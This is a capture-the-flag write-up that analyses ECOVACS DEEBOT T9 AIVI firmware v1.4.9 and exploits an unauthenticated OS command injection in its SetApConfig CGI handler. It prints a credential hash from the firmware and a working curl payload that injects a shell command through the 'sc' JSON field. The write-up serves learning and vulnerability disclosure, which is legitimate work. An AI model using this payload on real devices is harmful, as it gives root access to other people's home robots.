# Clean Sweep — CTF Writeup

**Challenge:** Clean Sweep  
**Category:** Web / IoT / Firmware  
**Flag:** `NNS{th1s_1s_olD_fiRmw4r3_so_ofC_th15_15_345Y_FoR_You}`

---

## Description

> The NNS house has never been cleaner, but our old ECOVACS DEEBOT T9 AIVI is still running firmware 1.4.9 from 2021. We extracted the web CGI from that firmware and are hosting it here for you. The floors may be spotless. The firmware is another story. Can you sweep through it and get root?
>
> Flag is at `/root/flag.txt`

---

## Reconnaissance

### Discovering Endpoints

The target returns `HTTP 200` with an empty JSON body for every path, served by `nginx/1.22.1` acting as a reverse proxy in front of the GoAhead embedded web server.

Scanning with gobuster (filtering out empty responses) revealed that unknown paths return `503` with a fixed 1145-byte GoAhead error page, while a handful of paths return `200`:

```
/ping.cgi
/cmd.cgi
/diag.cgi
/wifi_test.cgi
```

All other paths (including the ones from `cgi-bin/`) return 503.

---

## Firmware Analysis

### Downloading the Firmware

The challenge mentions firmware v1.4.9 for the ECOVACS DEEBOT T9 AIVI. Using [`ecovacs-firmware-tools`](https://github.com/denysvitali/ecovacs-firmware-tools) with model ID `659yh8`:

```bash
git clone https://github.com/denysvitali/ecovacs-firmware-tools.git
cd ecovacs-firmware-tools
go build -o ecovacs-firmware-tools .
./ecovacs-firmware-tools download --models 659yh8 --download --base-version 1.4.8
```

This downloads `659yh8_fw0_v1.4.9_1de7de90.bin` (59 MB).

### Decrypting and Extracting

```bash
./ecovacs-firmware-tools decrypt downloads/659yh8_fw0_v1.4.9_1de7de90.bin -o extracted/
sudo unsquashfs -d squashfs-root extracted/normal_fs.img
```

The firmware contains a SquashFS root filesystem. Key files found:

| Path | Description |
|------|-------------|
| `/usr/sbin/goahead` | GoAhead embedded web server binary |
| `/etc/www/reqDo` | CGI handler binary (aarch64 ELF, with debug info) |
| `/etc/www/route.txt` | GoAhead route configuration |
| `/etc/www/auth.txt` | Web auth credentials |
| `/etc/conf/cgi.conf` | CGI config pointing to bumbee_hook.sh |
| `/etc/wifi/bumbee_hook.sh` | Shell script dispatching CGI actions |

### GoAhead Configuration

`/etc/www/route.txt`:
```
route uri=/action handler=action
route uri=/ extensions=jst,asp handler=jst
route uri=/ extension=cgi|fcgi|mycgi handler=cgi
route uri=/ methods=OPTIONS|TRACE handler=options
route uri=/auth/basic/ auth=basic abilities=create,edit,view
route uri=/ auth=form handler=continue redirect=401@/pub/login.html
```

`/etc/www/auth.txt`:
```
role name=manager abilities=view,edit,delete
user name=joshua password=2fd6e47ff9bb70c0465fd2f5c8e5305e roles=manager
```

### Understanding reqDo

The `reqDo` binary is the CGI handler. By dumping the `.rodata` section with `aarch64-linux-gnu-objdump`, we found the popen command template for `SetApConfig`:

```
td="SetApConfig" SSID="%s" PASSPHRASE="%s" sc="%s" sck2="%s" lb="%s" %s
```

The last `%s` is the path to `bumbee_hook.sh` from `cgi.conf`.

Crucially, the **JSON field names** used by `reqDo` to extract values are:
- `td` — action dispatcher
- `s` — SSID (base64-encoded by `CFBase64Encode` before insertion)
- `p` — PASSPHRASE (also base64-encoded)
- `sc`, `sck2`, `lb` — passed **raw** into the shell command string (no encoding!)

### The Vulnerability in bumbee_hook.sh

The `CmdSetApConfig` function in `bumbee_hook.sh`:

```sh
CmdSetApConfig() {
    if [ -n "$SSID" ]; then
        SSID2=`echo $SSID | base64 -d | cjson`
        if [ -n "$PASSPHRASE" ]; then
            PWD2=`echo $PASSPHRASE | base64 -d | cjson`
            ...
        fi
    fi
    ...
    echo -n "{\"ret\":\"ok\"}"
    exit 0
}
```

The `SSID` and `PASSPHRASE` fields are base64-decoded (safe), but the `sc`, `sck2`, and `lb` fields are set as **unquoted environment variables** directly in the `popen` shell command. Injecting a double-quote followed by shell metacharacters into `sc` (or `sck2` or `lb`) breaks out of the quoted string and executes arbitrary commands.

---

## Exploitation

### Final Payload

```bash
curl -si "https://clean-sweep-83a35863c3ec.chall.nnsc.tf/wifi_test.cgi" \
  -X POST -H "Content-Type: application/json" \
  -d '{"td":"SetApConfig","s":"dGVzdA==","p":"dGVzdA==","sc":"x\" ; cat /root/flag.txt ; echo \"","sck2":"x","lb":"x"}'
```

The injected `sc` value `x" ; cat /root/flag.txt ; echo "` causes the popen command to become:

```sh
td="SetApConfig" SSID="dGVzdA==" PASSPHRASE="dGVzdA==" sc="x" ; cat /root/flag.txt ; echo "" sck2="x" lb="x" /etc/wifi/bumbee_hook.sh
```

The `cat /root/flag.txt` executes and its output is captured by `reqDo`'s `popen` read loop and returned in the HTTP response body.

### Response

```
NNS{th1s_1s_olD_fiRmw4r3_so_ofC_th15_15_345Y_FoR_You}
```

---

## Summary

| Step | Detail |
|------|--------|
| Target | ECOVACS DEEBOT T9 AIVI firmware v1.4.9 CGI web interface |
| Vulnerability | OS Command Injection via unquoted `sc`/`sck2`/`lb` parameters in `SetApConfig` |
| Injection point | `sc` field in JSON POST body to any `.cgi` endpoint |
| Root cause | `reqDo` passes `sc`, `sck2`, `lb` raw into a `popen` shell command without sanitization or quoting |
| Impact | Unauthenticated RCE as root |

---

## One-liner

```bash
curl -s https://clean-sweep-83a35863c3ec.chall.nnsc.tf/wifi_test.cgi \
  -X POST -H "Content-Type: application/json" \
  -d '{"td":"SetApConfig","s":"dGVzdA==","p":"dGVzdA==","sc":"x\" ; cat /root/flag.txt ; echo \"","sck2":"x","lb":"x"}'
```
